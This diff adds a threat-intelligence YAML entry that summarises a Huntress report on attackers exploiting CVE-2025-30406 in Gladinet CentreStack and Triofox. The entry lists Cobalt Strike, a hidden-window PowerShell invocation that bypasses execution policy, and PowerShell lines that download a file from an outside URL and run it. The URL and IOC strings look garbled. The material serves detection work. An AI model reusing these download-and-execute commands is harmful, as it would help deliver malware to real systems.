@@ -1,0 +1,30 @@
+summary: "Huntress report details exploitation of CVE-2025-30406 in Gladinet CentreStack & Triofox, along with observations on social engineering tactics and abused remote access tools."
+date: "2025-04-04"
+authors:
+  - Huntress
+attribution: 
+malware_families:
+  - Cobaltstrike
+TTPs:
+  processs:
+    - Centre.exe
+    - powershell
+  commandline:
+    - C:\Users\Public\Downloads\Centre.exe %
+    - powershell -NoProfile Windowstyle Hidden -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\\Users\\BT\\AppData\\Local\\Temp\\gmt-2025.04.04.ps1"
+  powershell:
+    - Invoke-RestMethod -Uri "https://rtps77qq525TSoTCAy/T"-OGtFIe $path
+    - Start-Process $path
+  registry_keys: []
+  network_connections: 
+    - destination: https://rtps77qq525TSoTCAy/T"-OGtFIe
+  file_modifications:
+    - C:\\Users\\BT\\AppData\\Local\\Temp\\gmt-2025.04.04.ps1
+  persistence: []
+  pipes: []
+  process_relations: 
+    - Centre.exe -> powershell
+IOCs:
+  - rtps77qq525TSoTCAy/T"-OGtFIe
+  - CVE-2025-30406
+reference: https://www.huntress.com/blog
